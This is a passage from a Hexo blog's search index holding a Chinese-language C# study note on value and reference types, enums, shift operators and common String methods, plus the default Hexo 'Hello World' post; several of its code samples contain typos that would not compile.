public int Age &#123; get; set; &#125;        &#x2F;&#x2F;定义值类型</span><br><span class="line">		&#125;</span><br><span class="line">		public static class ReferenceAndValue</span><br><span class="line">		&#123;</span><br><span class="line">			public static void Demonstration()</span><br><span class="line">			&#123;</span><br><span class="line">				stamp Stamp_1 &#x3D; new stamp &#123; Name &#x3D; &quot;Premiere&quot;, Age &#x3D; 25 &#125;;      &#x2F;&#x2F;实例化</span><br><span class="line">				stamp Stamp_2 &#x3D; new stamp &#123; Name &#x3D; &quot;Again&quot;, Age &#x3D; 47 &#125;;     &#x2F;&#x2F;实例化</span><br><span class="line">				int age &#x3D; Stamp_1.Age;      &#x2F;&#x2F;获取值类型Age的值</span><br><span class="line">				Stamp_1.Age &#x3D; 22;       &#x2F;&#x2F;修改值类型的值</span><br><span class="line">				stamp guru &#x3D; Stamp_2;       &#x2F;&#x2F;获取Stamp_2中的值</span><br><span class="line">				Stamp_2.Name &#x3D; &quot;Again Amend&quot;;       &#x2F;&#x2F;修改引用的Name值</span><br><span class="line">				Console.WriteLine(&quot;Stamp_1&#39;s age:&#123;0&#125;&quot;, Stamp_1.Age);       &#x2F;&#x2F;显示Stamp_1中的Age值</span><br><span class="line">				Console.WriteLine(&quot;age’s value:&#123;0&#125;&quot;, age);       &#x2F;&#x2F;显示age的值</span><br><span class="line">				Console.WriteLine(&quot;Stamp_2’s name:&#123;0&#125;&quot;, Stamp_2.Name);      &#x2F;&#x2F;显示Stamp_2中的Name值</span><br><span class="line">				Console.WriteLine(&quot;guru’s name:&#123;0&#125;&quot;, guru.Name);     &#x2F;&#x2F;显示guru中的Name值</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<img data-src="/hexo-test/Game/Code-Language/C%EF%BC%83-StudyNote/%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B%E4%B8%8E%E5%80%BC%E7%B1%BB%E5%9E%8B%E5%8C%BA%E5%88%AB.png" class title="结果">



<p><strong>值类型：</strong><br>创建时就在内存中占用了相应的数值类型的字节数，修改值类型就是修改相应的内存中的值<br><strong>引用类型：</strong><br>创建时指向的是内存中的一个地址，修改他相当于修改对应地址中的值，将对所有引用同一类型的值造成影响（类似于指针）</p>
<h3 id="枚举类型"><a href="#枚举类型" class="headerlink" title="枚举类型"></a>枚举类型</h3><p> C#中使用enum来声明枚举变量，它用于声明一组具有相同性质的常量。</p>
<ul>
<li>在定义枚举类型时，如果不对其进行赋值，默认情况下，第一个枚举数的值为0，后面每个枚举值依次加一。</li>
</ul>
<p>实例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Program</span><br><span class="line">&#123;</span><br><span class="line">	enum MyDate		&#x2F;&#x2F;使用enum创建枚举类型</span><br><span class="line">	&#123;</span><br><span class="line">		Sun &#x3D; 0,</span><br><span class="line">		Mon &#x3D; 1,</span><br><span class="line">		Tue &#x3D; 2,</span><br><span class="line">		Wed &#x3D; 3，</span><br><span class="line">		Thi &#x3D; 4,</span><br><span class="line">		Fri &#x3D; 5,</span><br><span class="line">		Sat &#x3D; 6</span><br><span class="line">	&#125;</span><br><span class="line">	static void Main (string[] args)</span><br><span class="line">	&#123;</span><br><span class="line">		int k &#x3D; (int)DateTime.Now.DayOfWeek;		&#x2F;&#x2F;获取今天是星期几，并将获取的值强制转换成int类型</span><br><span class="line">		switch(k)</span><br><span class="line">		&#123;</span><br><span class="line">			case (int)MyDate.Sun: </span><br><span class="line">			Console.WriteLine(&quot;今天是星期日“）；</span><br><span class="line">			break；</span><br><span class="line">			case (int)MyDate.Mon: </span><br><span class="line">			Console.WriteLine(&quot;今天是星期一“）；</span><br><span class="line">			break；</span><br><span class="line">			case (int)MyDate.Tue: </span><br><span class="line">			Console.WriteLine(&quot;今天是星期二“）；</span><br><span class="line">			break；</span><br><span class="line">			case (int)MyDate.Wed: </span><br><span class="line">			Console.WriteLine(&quot;今天是星期三“）；</span><br><span class="line">			break；</span><br><span class="line">			case (int)MyDate.Thi: </span><br><span class="line">			Console.WriteLine(&quot;今天是星期四“）；</span><br><span class="line">			break；</span><br><span class="line">			case (int)MyDate.Fri: </span><br><span class="line">			Console.WriteLine(&quot;今天是星期五“）；</span><br><span class="line">			break；</span><br><span class="line">			case (int)MyDate.Sat: </span><br><span class="line">			Console.WriteLine(&quot;今天是星期六“）；</span><br><span class="line">			break；</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		Console.ReadLine();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int(k) &#x3D; (int)DateTime.Now.DayOfWeek;		&#x2F;&#x2F;获取当前是星期几</span><br></pre></td></tr></table></figure>
<h1 id="字符操作"><a href="#字符操作" class="headerlink" title="字符操作"></a>字符操作</h1><h2 id="移位运算符（-gt-gt-amp-lt-lt-）"><a href="#移位运算符（-gt-gt-amp-lt-lt-）" class="headerlink" title="移位运算符（&gt;&gt;&amp;&lt;&lt;）"></a>移位运算符（&gt;&gt;&amp;&lt;&lt;）</h2><p>将数向指定的的方向移位，超出的位次会丢失，不足的则以0补充</p>
<ul>
<li>说明：<font size="1.5">在右移时,如果第一个操作数为int或uint (32位数),则移位数由第二个操作数的低5· 位给出;如果第一个操作数为long或ulong (64位数),则移位数由第二个操作数的低6位给出;如果第一个操作数为int或long,则右移位是算术移位(高序空位设置为符号位),如果第一个操作数为uint或ulong类型,则右移位是逻辑移位(高位填充0).</font></li>
</ul>
<h2 id="字符类Char的使用"><a href="#字符类Char的使用" class="headerlink" title="字符类Char的使用"></a>字符类Char的使用</h2><img data-src="/hexo-test/Game/Code-Language/C%EF%BC%83-StudyNote/Char'suse1.png" class>
<img data-src="/hexo-test/Game/Code-Language/C%EF%BC%83-StudyNote/Char'suse2.png" class>



<p>Is开头的方法返回值为bool值（True or False）</p>
<h2 id="字符串类String的使用"><a href="#字符串类String的使用" class="headerlink" title="字符串类String的使用"></a>字符串类String的使用</h2><p>可通过Str[num]获取字符串中响应位置的单个字符，string 类型的字符串序号从0开始<br>实例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string Str1 &#x3D; “CosoleApp1”;</span><br><span class="line">char Cha1&#x3D; Str[0];		&#x2F;&#x2F;获取C</span><br><span class="line">char Cha2 &#x3D; Str[3]；		&#x2F;&#x2F;获取第二个o</span><br></pre></td></tr></table></figure>
<p>1、 Compare 方法</p>
<p>Compare方法用来比较两个字符串是否相等，它有很多的重载方法，其中最常见的两种方法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Int Compare(string StrA,string StrB)		&#x2F;&#x2F;StrA和StrB代表要比较的两个字符串</span><br><span class="line">Int Compare(string StrA,string StrB,bool ignorCase)		&#x2F;&#x2F;ignorCase是一个布尔型变量，如果为true，那么在比较的时候就忽略大小写的差别。Compare方法是一个静态方法，所以在使用时可以直接使用</span><br></pre></td></tr></table></figure>
<p>2、 Equals 方法</p>
<p>Equals方法主要用于比较两个字符串是否相同，如果是则返回true，否则为false，常用语法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public bool Equals (string value)		&#x2F;&#x2F;value是要跟实例比较的字符串</span><br><span class="line">public static bool Equals (string a,string b)		&#x2F;&#x2F;a、b是两个要比较的字符串</span><br></pre></td></tr></table></figure>
<p>实例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">static void Main (string[] args)</span><br><span class="line">&#123;</span><br><span class="line">	string Str1 &#x3D; &quot;我要开学&quot;；</span><br><span class="line">	string Str2 &#x3D; &quot;我要写作业&quot;；</span><br><span class="line">	Console.WriteLine (Str1.Equals(Str2));</span><br><span class="line">	Console.WriteLine (String.Equals(Str1,Str2));</span><br><span class="line">	Console.ReadLine();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果为：<br>False<br>False</p>
<p>3、 Format方法（格式化字符串，用于将字符串格式化成为指定的格式）</p>
<p>实例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">static void Main(string[] args)</span><br><span class="line">&#123;</span><br><span class="line">	string Str1&#x3D;”11”;</span><br><span class="line">	string Str2&#x3D;”22”;</span><br><span class="line">	string NewStr&#x3D;String.Format&#123;“&#123;0&#125;,&#123;1&#125;!!”,Str1,Str2&#125;;		&#x2F;&#x2F;格式化字符串（此处应注意的是定义字符类型时使用的是string，而调用方法时使用的是String类，S大写）</span><br><span class="line">	Console.WriteLine(NewStr);		&#x2F;&#x2F;输出结果为11,22！！</span><br><span class="line">	Console.ReadLine(); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img data-src="/hexo-test/Game/Code-Language/C%EF%BC%83-StudyNote/Date'sRule.png" class>

<p>实例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">static void Main(string[] args)</span><br><span class="line">&#123;</span><br><span class="line">	DateTime dt &#x3D;DateTime.Now;		&#x2F;&#x2F;定义DateTime类型的变量，并获取当前的系统时间</span><br><span class="line">	string Str1 &#x3D; String.Format(“&#123;0:D&#125;”,dt);		&#x2F;&#x2F;将获取的系统时间格式化为YYYY年MM月dd日</span><br><span class="line">	Console.WiteLine(Str1)</span><br><span class="line">	Console.ReadLine();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果：</p>
<img data-src="/hexo-test/Game/Code-Language/C%EF%BC%83-StudyNote/Format1.png" class> 

<p>如果不格式化（//string Str1 = String.Format(“{0:D}”,dt);）运行的结果为：</p>
<img data-src="/hexo-test/Game/Code-Language/C%EF%BC%83-StudyNote/Format2.png" class> 

<p>4、 Substring(截取字符串)<br>实例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">static void Main(string[] args)</span><br><span class="line">&#123;</span><br><span class="line">	string Str1 &#x3D; “abcdef”;</span><br><span class="line">	string Str2 &#x3D; “”;		&#x2F;&#x2F;定义字符串，string类型的是引用类型，必须赋初值</span><br><span class="line">	Str2 &#x3D; Str1.Substring(1,4);		&#x2F;&#x2F;截取字符串，代表将Str1从第二位字符开始截取四位字符</span><br><span class="line">	Console.WriteLine(Str2);		&#x2F;&#x2F;输出结果将会是bcde</span><br><span class="line">	Console.ReadLine();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>说明：<font size="1.5">在使用Substring方法截取字符串时，如果length参数的长度大于截取字符串的长度，将从起始位置的索引处截取之后的所有字符。</font></li>
</ul>
<p>5、 Split(分割字符串)</p>
<p>实例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">static void Main(string[] args)</span><br><span class="line">&#123;</span><br><span class="line">	string Str1 &#x3D; “ab^cd#e,fg”</span><br><span class="line">	char[] sep &#x3D; &#123;‘^’,’#’,’,’&#125;;		&#x2F;&#x2F;声明分隔字符的数组</span><br><span class="line">	String[] sepstring &#x3D; new String[100];		&#x2F;&#x2F;声明一个字符串数组</span><br><span class="line">	sepstring &#x3D; Str1.Solit(sep);		&#x2F;&#x2F;作分割处理</span><br><span class="line">	for (int i&#x3D;0;i&lt;sepstring.Length.i++)</span><br><span class="line">	&#123;</span><br><span class="line">		Console.WriteLine(“item&#123;0&#125;:&#123;1&#125;”,I,sepstring[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	Console.ReadLine();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果为：</p>
<img data-src="/hexo-test/Game/Code-Language/C%EF%BC%83-StudyNote/SplitRun1.png" class>

<p>Split会将所有被指定字符分隔的字符串全部分离，例如<br>string Str1 = “ab^c#d^ef,g”;若将源字符串这样赋值<br>char[] sep = { ‘^’, ‘#’, ‘,’ };分隔字符串不变<br>将输出：</p>
<img data-src="/hexo-test/Game/Code-Language/C%EF%BC%83-StudyNote/SplitRun2.png" class>


]]></content>
      <categories>
        <category>Information Security Study</category>
        <category>Code Language</category>
        <category>C＃</category>
        <category>Game</category>
        <category>Code Language</category>
      </categories>
      <tags>
        <tag>C＃</tag>
        <tag>Game</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/hexo-test/uncategorized/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><a id="more"></a>

<h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
]]></content>
  </entry>
</search>
